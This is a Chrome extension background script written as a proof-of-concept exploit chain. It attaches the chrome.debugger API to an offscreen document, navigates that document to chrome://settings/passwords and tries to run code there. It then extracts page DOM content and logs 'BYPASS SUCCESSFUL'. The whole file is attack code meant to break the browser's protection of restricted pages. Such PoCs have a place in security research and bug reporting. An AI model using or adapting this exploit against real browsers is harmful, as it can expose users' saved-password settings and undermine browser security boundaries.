chrome.action.onClicked.addListener(async () => {
  console.log("[*] starting exploit chain...");

  // 1. spawn the offscreen document
  const existingContexts = await chrome.runtime.getContexts({
    contextTypes: ['OFFSCREEN_DOCUMENT']
  });

  if (existingContexts.length === 0) {
    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['DOM_SCRAPING'], // reason doesn't matter, just needs to be valid
      justification: 'poc'
    });
    console.log("[+] offscreen document created");
  }

  // 2. find the debugger target for the offscreen doc
  const targets = await chrome.debugger.getTargets();
  const offscreenTarget = targets.find(t => 
    t.url.includes(chrome.runtime.id) && 
    t.url.includes('offscreen.html')
  );
  if (!offscreenTarget) {
    console.error("[-] couldn't find offscreen target in devtools list.");
    return;
  }

  console.log(`[+] found offscreen target id: ${offscreenTarget.id}`);
  const debuggee = { targetId: offscreenTarget.id };

  try {
    // 3. attach the debugger
    await chrome.debugger.attach(debuggee, "1.3");
    console.log("[+] debugger attached to offscreen document");

    // 4. force the navigation to a restricted page
    console.log("[*] sending Page.navigate to chrome://settings/passwords...");
    await chrome.debugger.sendCommand(debuggee, "Page.enable");
    await chrome.debugger.sendCommand(debuggee, "Page.navigate", {
      url: "chrome://settings/passwords"
    });

    // 5. wait a moment for the navigation to commit, then try to execute code
    setTimeout(async () => {
      console.log("[?] checking if debugger survived the navigation...");
      try {
        const res = await chrome.debugger.sendCommand(debuggee, "Runtime.evaluate", {
          expression: "document.body.innerHTML.substring(0, 150)",
          returnByValue: true
        });
        
        console.log("[!] BYPASS SUCCESSFUL! execution context retained on restricted page.");
        console.log("[!] extracted dom data:", res);
        
      } catch (err) {
        console.error("[-] bypass failed. debugger likely detached during navigation:", err);
      }
    }, 2000);

  } catch (err) {
    console.error("[-] debugger error:", err);
  }
});

// listen for detach events to see if the browser's security caught us
chrome.debugger.onDetach.addListener((source, reason) => {
  console.warn(`[!] debugger forcefully detached from ${source.targetId}. reason: ${reason}`);
});
